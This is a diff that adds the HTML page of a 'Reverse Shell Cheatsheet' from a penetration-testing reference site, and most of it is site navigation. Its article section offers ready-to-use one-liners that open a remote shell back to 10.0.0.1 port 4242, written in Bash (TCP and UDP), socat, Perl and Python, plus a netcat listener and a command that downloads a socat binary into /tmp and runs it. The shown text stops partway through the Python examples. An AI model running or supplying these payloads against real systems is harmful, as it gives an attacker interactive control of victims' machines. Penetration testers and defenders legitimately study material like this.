@@ -1,0 +1,2028 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="A quick reference and/or cheatsheet for popping reverse shells. One-lines and more!">
+<meta name="theme-color" content="#FFFFFF">
+<meta name="color-scheme" content="light dark"><meta property="og:title" content="Reverse Shell Cheatsheet" />
+<meta property="og:description" content="A quick reference and/or cheatsheet for popping reverse shells. One-lines and more!" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.grayhatfreelancing.com/docs/reverse_shell_cheatsheet/" /><meta property="article:section" content="docs" />
+<meta property="article:published_time" content="2022-11-03T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-11-03T00:00:00+00:00" />
+<title>Reverse Shell Cheatsheet | Gray Hat Freelancing</title>
+<link rel="manifest" href="/manifest.json">
+<link rel="icon" href="/favicon.png" type="image/x-icon">
+<link rel="stylesheet" href="/book.min.4b35fed0bea034bbc19c89c71e14b73fb9c68cfcc586b9382adfb9b7b103ba06.css" integrity="sha256-SzX&#43;0L6gNLvBnInHHhS3P7nGjPzFhrk4Kt&#43;5t7EDugY=" crossorigin="anonymous">
+  <script defer src="/flexsearch.min.js"></script>
+  <script defer src="/en.search.min.afc3b3563d1884d85d5f5db04c9a930f7d7c354fdac44481534920d345015a5b.js" integrity="sha256-r8OzVj0YhNhdX12wTJqTD318NU/axESBU0kg00UBWls=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-124168691-2', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script><!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+  
+</head>
+<body dir="ltr">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    <aside class="book-menu">
+      <div class="book-menu-content">
+        
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Gray Hat Freelancing</span>
+  </a>
+</h2>
+
+
+<div class="book-search">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+
+
+
+  
+
+
+
+  
+    
+  
+    
+  
+
+
+
+<ul class="book-languages">
+  <li>
+    <input type="checkbox" id="languages" class="toggle" />
+    <label for="languages" class="flex justify-between">
+      <a role="button" class="flex align-center">
+        <img src="/svg/translate.svg" class="book-icon" alt="Languages" />
+        English
+      </a>
+    </label>
+
+    <ul>
+      
+      <li>
+        <a href="https://www.grayhatfreelancing.com/ru/">
+          Russian
+        </a>
+      </li>
+      
+      <li>
+        <a href="https://www.grayhatfreelancing.com/zh/">
+          Chinese
+        </a>
+      </li>
+      
+    </ul>
+  </li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <ul>
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <a href="/docs/example/" class="">Example Site</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/" class="">Table of Contents</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/with-toc/" class="">With ToC</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/without-toc/" class="">Without ToC</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-4e46b01272d410b3a99461d79326ddf4" class="toggle"  />
+    <label for="section-4e46b01272d410b3a99461d79326ddf4" class="flex justify-between">
+      <a role="button" class="">Collapsed</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/collapsed/3rd-level/" class="">3rd Level</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/collapsed/3rd-level/4th-level/" class="">4th Level</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/attacking_active_directory/" class="">Active Directory Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/tryhackme_olympus/" class="">Olympus - TryHackMe Walkthrough</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/wordpress/" class="">Wordpress Security</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_hardening/" class="">Windows - Hardening</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_amsi_bypass/" class="">Bypassing AMSI protections</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/subdomains_enumeration/" class="">Enumerating Subdomains</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_mimikatz/" class="">Windows - Mimikatz</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_persistence/" class="">Windows - Persistence</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_privilege_escalation/" class="">Windows - Privilege Escalation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_using_credentials/" class="">Windows - Using Credentials</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_download_and_execute/" class="">Windows Download and Execute Methods</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/escape_breakout/" class="">Application Escape and Breakout</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/office_attacks/" class="">Attacking Office</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/bind_shell_cheatsheet/" class="">Bind Shell Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/methodology_and_enumeration/" class="">Bug Hunting Methodology and Enumeration</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cobalt_strike_all_you_need/" class="">Cobalt Strike</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/hash_cracking/" class="">Hash Cracking Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/linux_persistence/" class="">Linux - Persistence</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/linux_privilege_escalation/" class="">Linux - Privilege Escalation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/metasploit_cheatsheet/" class="">Metasploit</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_dpapi/" class="">Microsoft Window&#39;s Data Protection API</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/microsoft_azure_cloud/" class="">Microsoft&#39;s Azure Cloud</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/network_discovery/" class="">Network Discovery</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/network_pivoting_techniques/" class="">Network Pivoting Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/mssql_server_cheatsheet/" class="">Pentesting MSSQL Server Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/powershell_cheatsheet/" class="">Powershell Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/reverse_shell_cheatsheet/" class="active">Reverse Shell Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/source_code_management/" class="">Source Code Management</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/docker_pentesting/" class="">Docker Security</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/miscellaneous_tricks/" class="">Miscellaneous Tips and Tricks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/graphql_injection/" class="">GraphQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/csv_injection/" class="">Csv Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/checking_for_account_takeover/" class="">Account Takeovers</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/amazon_aws_s3_buckets/" class="">Amazon AWS S3 Buckets</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/api_key_leaks/" class="">API Key Leaks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/command_injection/" class="">Command Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cors_misconfigurations/" class="">CORS Misconfigurations</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/crlf_injection/" class="">CRLF Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/csrf_injection/" class="">CSRF Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cve_exploits/" class="">CVE Exploits</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/dependency_confusion_attacks/" class="">Dependency Confusion</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/dns_rebinding/" class="">DNS Rebinding</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/file_inclusion/" class="">File Inclusion</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/http_parameter_pollution/" class="">HTTP Parameter Pollution</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_deserialization/" class="">Insecure Deserialization</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_direct_object_references/" class="">Insecure Direct Object References</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_file_uploads/" class="">Insecure File Upload</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_management_interfaces/" class="">Insecure Management Interface</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_source_code_management/" class="">Insecure Source Code Management</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/java_rmi/" class="">Java RMI</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/json_web_token/" class="">JSON Web Tokens</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/kuburnetes/" class="">Kuburnetes</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/latex_injection/" class="">LaTeX Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ldap_injection/" class="">LDAP Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/nosql_injection/" class="">NoSQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/oauth/" class="">OAuth</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/open_url_redirection/" class="">Open URL Redirection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/race_conditions/" class="">Race Conditions</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/request_smuggling/" class="">Request Smuggling</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/saml_injection/" class="">SAML Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/server_side_request_forgery/" class="">Server-Side Request Forgery</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/server_side_template_injection/" class="">Server-Side Template Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/sql_injection/" class="">SQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/tabnabbing/" class="">Tabnabbing</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/type_juggling/" class="">Type Juggling</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/web_cache_deception/" class="">Web Cache Deception</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/web_sockets/" class="">Web Sockets Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/xxe_injection/" class="">XML eXternal Entity Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/xpath_injection/" class="">XPATH Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/xslt_injection/" class="">XSLT Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/xss_injection/" class="">XSS Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <span>Shortcodes</span>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/buttons/" class="">Buttons</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/columns/" class="">Columns</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/details/" class="">Details</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/expand/" class="">Expand</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/hints/" class="">Hints</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/katex/" class="">Katex</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/mermaid/" class="">Mermaid</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-d3fc1bf6d66cd84b896a0af9f40cb1d5" class="toggle"  />
+    <label for="section-d3fc1bf6d66cd84b896a0af9f40cb1d5" class="flex justify-between">
+      <a href="/docs/shortcodes/section/" class="">Section</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/section/first-page/" class="">First Page</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/section/second-page/" class="">Second Page</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/tabs/" class="">Tabs</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/directory_traversal/" class="">Directory Traversal</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+
+
+
+
+  
+<ul>
+  
+  <li>
+    <a href="/posts/"  >
+        Blog
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://github.com/m00tiny/"  target="_blank" rel="noopener">
+        Github
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://github.com/m00tiny/grayhatfreelancing"  target="_blank" rel="noopener">
+        Contribute
+      </a>
+  </li>
+  
+</ul>
+
+
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+ 
+      </div>
+    </aside>
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <strong>Reverse Shell Cheatsheet</strong>
+
+  <label for="toc-control">
+    
+    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden clearfix">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#reverse-shell-cheat-sheet">Reverse Shell Cheat Sheet</a>
+      <ul>
+        <li><a href="#tools">Tools</a></li>
+        <li><a href="#reverse-shell">Reverse Shell</a>
+          <ul>
+            <li><a href="#bash-tcp">Bash TCP</a></li>
+            <li><a href="#bash-udp">Bash UDP</a></li>
+            <li><a href="#socat">Socat</a></li>
+            <li><a href="#perl">Perl</a></li>
+            <li><a href="#python">Python</a></li>
+            <li><a href="#php">PHP</a></li>
+            <li><a href="#ruby">Ruby</a></li>
+            <li><a href="#golang">Golang</a></li>
+            <li><a href="#netcat-traditional">Netcat Traditional</a></li>
+            <li><a href="#netcat-openbsd">Netcat OpenBsd</a></li>
+            <li><a href="#netcat-busybox">Netcat BusyBox</a></li>
+            <li><a href="#ncat">Ncat</a></li>
+            <li><a href="#openssl">OpenSSL</a></li>
+            <li><a href="#powershell">Powershell</a></li>
+            <li><a href="#awk">Awk</a></li>
+            <li><a href="#java">Java</a></li>
+            <li><a href="#telnet">Telnet</a></li>
+            <li><a href="#war">War</a></li>
+            <li><a href="#lua">Lua</a></li>
+            <li><a href="#nodejs">NodeJS</a></li>
+            <li><a href="#groovy">Groovy</a></li>
+            <li><a href="#c">C</a></li>
+            <li><a href="#dart">Dart</a></li>
+          </ul>
+        </li>
+        <li><a href="#meterpreter-shell">Meterpreter Shell</a>
+          <ul>
+            <li><a href="#windows-staged-reverse-tcp">Windows Staged reverse TCP</a></li>
+            <li><a href="#windows-stageless-reverse-tcp">Windows Stageless reverse TCP</a></li>
+            <li><a href="#linux-staged-reverse-tcp">Linux Staged reverse TCP</a></li>
+            <li><a href="#linux-stageless-reverse-tcp">Linux Stageless reverse TCP</a></li>
+            <li><a href="#other-platforms">Other platforms</a></li>
+          </ul>
+        </li>
+        <li><a href="#spawn-tty-shell">Spawn TTY Shell</a></li>
+        <li><a href="#fully-interactive-reverse-shell-on-windows">Fully interactive reverse shell on Windows</a></li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown"><h1 id="reverse-shell-cheat-sheet">
+  Reverse Shell Cheat Sheet
+  <a class="anchor" href="#reverse-shell-cheat-sheet">#</a>
+</h1>
+<h2 id="tools">
+  Tools
+  <a class="anchor" href="#tools">#</a>
+</h2>
+<ul>
+<li>
+  <a href="https://www.revshells.com/">reverse-shell-generator</a> - Hosted Reverse Shell generator (
+  <a href="https://github.com/0dayCTF/reverse-shell-generator">source</a>) 
+  <img src="https://user-images.githubusercontent.com/44453666/115149832-d6a75980-a033-11eb-9c50-56d4ea8ca57c.png" alt="image" /></li>
+<li>
+  <a href="https://github.com/t0thkr1s/revshellgen">revshellgen</a> -  CLI Reverse Shell generator</li>
+</ul>
+<h2 id="reverse-shell">
+  Reverse Shell
+  <a class="anchor" href="#reverse-shell">#</a>
+</h2>
+<h3 id="bash-tcp">
+  Bash TCP
+  <a class="anchor" href="#bash-tcp">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash -i &gt;&amp; /dev/tcp/10.0.0.1/4242 0&gt;&amp;<span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/10.0.0.1/4242; sh &lt;&amp;<span style="color:#ae81ff">196</span> &gt;&amp;<span style="color:#ae81ff">196</span> 2&gt;&amp;<span style="color:#ae81ff">196</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/bin/bash -l &gt; /dev/tcp/10.0.0.1/4242 0&lt;&amp;<span style="color:#ae81ff">1</span> 2&gt;&amp;<span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><h3 id="bash-udp">
+  Bash UDP
+  <a class="anchor" href="#bash-udp">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Victim:
+</span></span><span style="display:flex;"><span>sh -i &gt;&amp; /dev/udp/10.0.0.1/4242 0&gt;&amp;<span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Listener:
+</span></span><span style="display:flex;"><span>nc -u -lvp <span style="color:#ae81ff">4242</span>
+</span></span></code></pre></div><p>Don&rsquo;t forget to check with others shell : sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash</p>
+<h3 id="socat">
+  Socat
+  <a class="anchor" href="#socat">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>user@attack$ socat file<span style="color:#960050;background-color:#1e0010">:</span>`tty`,raw,echo=<span style="color:#ae81ff">0</span> TCP-L<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">4242</span>
+</span></span><span style="display:flex;"><span>user@victim$ /tmp/socat exec<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#39;bash -li&#39;</span>,pty,stderr,setsid,sigint,sane tcp<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">10.0</span>.0.<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">4242</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>user@victim$ wget -q https<span style="color:#960050;background-color:#1e0010">:</span>//github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#39;bash -li&#39;</span>,pty,stderr,setsid,sigint,sane tcp<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">10.0</span>.0.<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">4242</span>
+</span></span></code></pre></div><p>Static socat binary can be found at 
+  <a href="https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat">https://github.com/andrew-d/static-binaries</a></p>
+<h3 id="perl">
+  Perl
+  <a class="anchor" href="#perl">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-perl" data-lang="perl"><span style="display:flex;"><span>perl <span style="color:#f92672">-</span>e <span style="color:#e6db74">&#39;use Socket;$i=&#34;10.0.0.1&#34;;$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>perl <span style="color:#f92672">-</span>MIO <span style="color:#f92672">-</span>e <span style="color:#e6db74">&#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&#34;10.0.0.1:4242&#34;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>NOTE: Windows only
+</span></span><span style="display:flex;"><span>perl <span style="color:#f92672">-</span>MIO <span style="color:#f92672">-</span>e <span style="color:#e6db74">&#39;$c=new IO::Socket::INET(PeerAddr,&#34;10.0.0.1:4242&#34;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</span>
+</span></span></code></pre></div><h3 id="python">
+  Python
+  <a class="anchor" href="#python">#</a>
+</h3>
+<p>Linux only</p>
+<p>IPv4</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>export RHOST<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;10.0.0.1&#34;</span>;export RPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4242</span>;python <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;import socket,os,pty;s=socket.socket();s.connect((os.getenv(&#34;RHOST&#34;),int(os.getenv(&#34;RPORT&#34;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&#34;/bin/sh&#34;)&#39;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>python <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.0.0.1&#34;,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&#34;/bin/sh&#34;)&#39;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>python <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.0.0.1&#34;,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;])&#39;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>python <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.0.0.1&#34;,4242));subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())&#39;</span>
